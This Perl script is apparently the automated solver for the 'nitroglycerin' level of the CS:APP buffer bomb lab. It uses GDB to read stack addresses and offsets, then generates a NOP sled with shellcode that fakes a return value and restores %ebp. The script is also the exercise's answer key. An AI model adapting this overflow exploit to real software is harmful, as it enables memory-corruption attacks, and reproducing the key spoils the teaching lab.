#!/usr/bin/perl 
#!/usr/local/bin/perl

use Getopt::Std;
use lib "/usr/share/perl/5.14.2/";
use config;

#######################################################################
# kaboom.pl - automatically solves a buffer bomb for nitroglycerin level
#
# Copyright (c) 2002, R. Bryant and D. O'Hallaron, All rights reserved.
# May not be used, modified, or copied without permission.
#
#######################################################################

$| = 1; # autoflush output on every print statement

#
# usage - print help message and terminate
#
sub usage 
{
    printf STDERR "$_[0]\n";
    printf STDERR "Usage: $0 [-h] -t <teamname>\n";
    printf STDERR "Options:\n";
    printf STDERR "  -t <teamname> Team name\n";
    printf STDERR "  -s            Submit solution to grading server\n";
    printf STDERR "  -h            Print this message\n";
    die "\n";
}

$flags = "";

# Get specified team and executable
getopts('hst:');
if ($opt_h) {
    usage();
}

if (!$opt_t) {
    usage("Missing team name (-t)\n");
}

if ($opt_s) {
    $flags = "-s";
}

$team = $opt_t;

# Make sure the makecookie binary is there 
system("cd $BINDIR; make > /dev/null 2>&1"); 

# Solve buffer bomb for specified team
$cookie = `$BINDIR/makecookie $team`;
chomp($cookie);

# Run GDB to extract runtime information
$gdbfile = "kaboom-$team.gdb";
open(GDB, ">$gdbfile") || die "Can't open GDB file $gdbfile\n";

# The gdb script runs the program far enough into getbufn that register
# %eax holds the value of buf.
# It then extracts:
#   $rp: The value of the return pointer
#   $ebpdiff: The difference between the current and old value of %ebp
#   $buf: An address of that's about halfway through buf 
#   $nopcount: The amount of padding to insert to make the buffer overflow
#   and overwrite the return pointer

print GDB <<GDBSTUFF;
break getbufn
run -t $team -n
stepi 4
print /x *((int*)\$ebp+1)
print /x *(int*)\$ebp - (int)\$ebp - 8
print /x (\$eax + 230)
print /d (\$ebp-\$eax-12)
quit
GDBSTUFF

close GDB;
$gdbout = `gdb -nw $EXECUTABLE -x $gdbfile | grep \"=\"`
    || die "Couldn't run gdb with batch file $gdbfile\n";

$gdbout =~ s/\$[0-9]* = //g;
($rp, $ebpdiff, $buf, $nopcount) = split(/\n/, $gdbout);

$asfile = "kaboom-$team.s";
open(AS, ">$asfile") || die "Can't open assembly code file $asfile\n";

# Generate assembly code.
# The nops go at the beginning, so that we can drop in somewhere in
# the middle, run through the nops, and then hit the real exploit code

for ($i = 0; $i < $nopcount; $i++) {
    print AS "\tnop\n";
}

print AS <<ASTUFF;
	movl \$ $cookie,%eax	# Alter return value
	movl %esp,%ebp
	addl \$ $ebpdiff,%ebp	# Fix %ebp
	pushl \$ $rp	        # Push correct return address on stack
	ret			# return
.align 4			# Round up to 16
	.long $buf		# Location of exploit code
ASTUFF

close AS;
